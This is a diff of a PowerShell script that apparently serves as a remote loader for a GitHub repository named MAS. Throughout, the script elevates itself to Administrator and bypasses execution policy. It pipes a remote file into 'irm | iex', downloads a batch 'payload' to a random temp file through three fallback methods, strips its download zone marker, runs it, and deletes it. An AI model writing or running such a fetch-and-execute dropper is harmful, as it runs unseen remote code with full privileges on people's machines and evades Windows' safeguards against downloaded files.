@@ -1,36 +1,34 @@
+<#
+    Remote Batch Script Loader & Runner
+    Target: DevJeffersonL/MAS
+#>
 $ErrorActionPreference = 'Stop'
 $ProgressPreference    = 'SilentlyContinue'
 
-# 1. Evaluate administrative execution token context
+# 1. Elevate to Administrator if not already elevated
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 if (-not $isAdmin) {
     Write-Host "[*] Requesting Administrator privileges..." -ForegroundColor Yellow
     try {
-        # REMOTE DEPLOYMENT CONFIGURATION NOTE:
-        # Update the placeholder string variable below to your target hosted repository address 
-        # to ensure the sub-process shell can map and download the command payload accurately.
-        $remoteScriptUrl = 'https://raw.githubusercontent.com/DevJeffersonL/MAS/refs/heads/main/Sample.txt' 
-        
         $psArgs = @(
             "-NoExit",
             "-NoProfile",
             "-ExecutionPolicy", "Bypass",
-            "-Command", "irm '$remoteScriptUrl' | iex"
+            "-Command", "irm 'https://raw.githubusercontent.com/DevJeffersonL/MAS/refs/heads/main/Sample.txt' | iex"
         )
         Start-Process -FilePath "powershell.exe" -ArgumentList $psArgs -Verb RunAs
         Exit
     } catch {
         Write-Host "[-] Administrator elevation was declined or failed: $($_.Exception.Message)" -ForegroundColor Red
-        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
         Exit
     }
 }
 
-# 2. Force modern TLS cryptographic protocols for GitHub transport paths
+# 2. Force modern TLS protocols (required for GitHub raw URLs)
 [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13
 
-# 3. Path variable mapping for target commit sequence download target
-$rawUrl   = 'https://githubusercontent.com'
+# 3. Path configuration
+$rawUrl   = 'https://raw.githubusercontent.com/DevJeffersonL/MAS/refs/heads/main/Sample.bat'
 $tempDir  = [System.IO.Path]::GetTempPath()
 $randTag  = [System.IO.Path]::GetRandomFileName().Substring(0, 6)
 $tempBat  = Join-Path -Path $tempDir -ChildPath "run_${randTag}.bat"
@@ -38,9 +36,11 @@ $tempBat  = Join-Path -Path $tempDir -ChildPath "run_${randTag}.bat"
 $downloadSuccess = $false
 
 Write-Host "[*] Connected as Administrator." -ForegroundColor Green
-Write-Host "[*] Downloading batch payload from specific commit stream..." -ForegroundColor Cyan
+Write-Host "[*] Downloading batch payload..." -ForegroundColor Cyan
 
-# Tier 1: System curl subsystem execution route
+# -------------------------------------------------------------------------
+# Tier 1: curl.exe
+# -------------------------------------------------------------------------
 if (Get-Command 'curl.exe' -ErrorAction SilentlyContinue) {
     try {
         & curl.exe -sL --fail "$rawUrl" -o "$tempBat" *>$null
@@ -50,7 +50,9 @@ if (Get-Command 'curl.exe' -ErrorAction SilentlyContinue) {
     } catch {}
 }
 
-# Tier 2: System .NET WebClient assembly streaming pipeline
+# -------------------------------------------------------------------------
+# Tier 2: .NET WebClient
+# -------------------------------------------------------------------------
 if (-not $downloadSuccess) {
     try {
         if (Test-Path -LiteralPath $tempBat) { Remove-Item -LiteralPath $tempBat -Force *>$null }
@@ -64,7 +66,9 @@ if (-not $downloadSuccess) {
     } catch {}
 }
 
-# Tier 3: Native PowerShell Invoke-WebRequest baseline fallback
+# -------------------------------------------------------------------------
+# Tier 3: Invoke-WebRequest
+# -------------------------------------------------------------------------
 if (-not $downloadSuccess) {
     try {
         if (Test-Path -LiteralPath $tempBat) { Remove-Item -LiteralPath $tempBat -Force *>$null }
@@ -76,31 +80,26 @@ if (-not $downloadSuccess) {
 }
 
 if (-not $downloadSuccess) {
-    Write-Host "[-] Critical Error: Unable to fetch script components from target URL destination." -ForegroundColor Red
-    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+    Write-Host "[-] Failed to download the batch payload from GitHub." -ForegroundColor Red
     return
 }
 
-# 4. Remove system restriction properties and handle process initialization
+# -------------------------------------------------------------------------
+# 4. Batch Execution
+# -------------------------------------------------------------------------
 try {
-    # Remove zone indicator metadata from download stream
     Unblock-File -LiteralPath $tempBat -ErrorAction SilentlyContinue
 
-    Write-Host "[+] Launching target workspace environment..." -ForegroundColor Green
-    Start-Sleep -Seconds 1
+    Write-Host "[+] Launching payload: $tempBat" -ForegroundColor Green
     
-    # Run targeted workspace shell engine context
-    & "$env:ComSpec" /c "`"$tempBat`""
+    # Use /k instead of /c so the command prompt stays open after running
+    & "$env:ComSpec" /k "`"$tempBat`""
 }
 catch {
-    Write-Host "[-] Execution engine error exception raised: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "[-] Execution failed: $($_.Exception.Message)" -ForegroundColor Red
 }
 finally {
-    Write-Host "`n--- Script Execution Lifecycle Complete ---" -ForegroundColor Cyan
-    Write-Host "Press any key to purge temporary script caches and close this window." -ForegroundColor Yellow
-    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-    
-    # Secure storage cleanup step
+    # Delete the temp file after the batch script finishes
     if (Test-Path -LiteralPath $tempBat) {
         Remove-Item -LiteralPath $tempBat -Force -ErrorAction SilentlyContinue
     }
